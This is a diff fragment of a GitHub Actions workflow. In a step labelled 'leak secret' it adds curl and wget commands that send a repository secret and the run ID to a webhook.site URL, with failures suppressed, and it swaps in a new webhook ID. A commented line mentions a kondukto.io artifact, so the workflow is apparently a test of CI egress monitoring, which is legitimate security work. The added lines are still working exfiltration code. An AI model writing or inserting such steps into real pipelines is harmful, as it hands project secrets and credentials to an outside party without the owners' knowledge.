@@ -45,8 +45,9 @@ jobs:
           SECRET: ${{ secrets.MY_SECRET }}
         run: |
           echo "leak secret"
-          curl --connect-timeout 10 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET\&id=$GITHUB_RUN_ID || true
-          wget --connect-timeout=3 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET\&id=$GITHUB_RUN_ID || true
+          curl --connect-timeout 10 https://webhook.site/1e623172-8909-4b80-840f-6e2c208ea788?secret=$SECRET\&id=$GITHUB_RUN_ID || true
+          sleep 0.5
+          wget --connect-timeout=3 https://webhook.site/1e623172-8909-4b80-840f-6e2c208ea788?secret=$SECRET\&id=$GITHUB_RUN_ID || true
           
         # Runs a set of commands using the runners shell
         #           wget --connect-timeout=3 https://download.kondukto.io/kntrl/myartifact.txt 
